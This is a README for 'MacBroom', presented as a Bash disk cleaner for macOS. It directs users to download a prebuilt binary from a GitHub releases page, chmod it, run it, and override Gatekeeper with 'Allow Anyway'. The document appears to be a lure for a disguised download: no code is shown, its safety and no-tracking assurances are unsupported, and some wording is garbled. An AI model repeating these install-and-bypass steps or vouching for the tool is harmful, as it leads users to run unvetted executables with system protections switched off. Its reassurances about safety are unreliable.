# 🧹 MacBroom - Free up disk space with ease

[![](https://img.shields.io/badge/Download-MacBroom-blue.svg)](https://github.com/capsulate-want802/MacBroom/releases)

## 📁 What is MacBroom?

MacBroom clears unnecessary files from your computer. It focuses on temporary data and logs that take up storage space. You can use it through a simple window in your terminal. Since it uses Bash, it runs fast. It does not need extra software to work. You keep your storage clean without complex menus or hidden settings.

## ⚙️ System Requirements

- A computer running macOS.
- At least 50 MB of free storage space.
- Access to the Terminal application.

## 📥 Getting Started

You need to download the MacBroom tool to your machine. 

1. Visit [this page to download](https://github.com/capsulate-want802/MacBroom/releases) the latest version.
2. Look for the file named `macbroom.tar.gz` and click it.
3. Save the file to your Downloads folder.

## 🚀 Running the software

Follow these steps to start cleaning your disk.

1. Open your Downloads folder.
2. Double-click the `macbroom.tar.gz` file to open it.
3. Open your Terminal application. You can find this by pressing Command + Space and typing "Terminal".
4. Navigate to your Downloads folder by typing `cd ~/Downloads` and pressing Enter.
5. Grant permission to run the tool by typing `chmod +x macbroom` and pressing Enter.
6. Start the tool by typing `./macbroom` and pressing Enter.

## 🛠 Features

MacBroom performs several tasks to keep your disk clean.

- Parallel scanning: The tool looks at multiple folders at the same time. This makes the search faster.
- Cache removal: It deletes old temporary files that applications no longer need.
- Log cleaning: It wipes system logs that grow over time.
- Safe deletion: It only removes files that are confirmed as temporary or unused.
- Zero dependencies: You do not have to install extra packages. Everything runs on your existing system.

## 🛡 Staying Safe

The software focuses on safety. It does not touch your personal photos, documents, or music. It targets folders that hold temporary data. If you feel unsure, you can look at the list of files before you delete them. The tool shows you exactly what it finds during the scan.

## ⏱ Disk Management Tips

Regular maintenance helps your computer stay fast. 

- Run MacBroom once every month. 
- Clear your trash bin after you run the tool. 
- Restart your computer after large cleanups to refresh the system. 
- Keep your important files in a separate folder from your temporary downloads.

## 📦 Troubleshooting

Some users might see a permissions error. This happens when the system security blocks new files. If your computer prevents you from running the tool, follow these steps:

1. Open System Settings.
2. Go to Privacy and Security.
3. Find the section for Security.
4. If you see a message about MacBroom, click "Allow Anyway." 
5. Return to the Terminal and type `./macbroom` again.

## 📖 Understanding the Terminal

The terminal is a text-based interface. It allows you to talk to your computer directly. You do not need to be a professional to use it. Just follow the commands exactly as written. If you make a typo, the computer will tell you in plain text.

## 💡 Frequent Questions

Can MacBroom break my system?
No. The scanner checks specific directories known to hold junk files. It ignores protected system files that your computer needs to stay powered on.

Does this work on other systems?
No. This tool is built for macOS. It uses bash scripts that rely on macOS file paths.

Where does the data go?
When you choose to delete files, the tool removes them from your drive. They do not go into your trash bin. They are gone once the process finishes. Check your findings carefully before you confirm the deletion.

How large are the files?
Most temporary files take up only a few kilobytes. However, some log files can grow to be hundreds of megabytes. Removing these logs saves space for your personal files.

What if the scan takes a long time?
The speed depends on how many files you have on your disk. A drive with many photos or videos takes longer to scan than a nearly empty drive. Leave the terminal window open until the scan finishes.

## 📜 Legal Information

MacBroom is an open project. You can inspect the code if you wish to see how it works. It contains no tracking software or hidden ads. You own your data. This software helps you manage your own disk space without interference. We provide this tool for personal use. Use it on your own hardware responsibilities. Always keep a backup of important files on an external drive or cloud storage.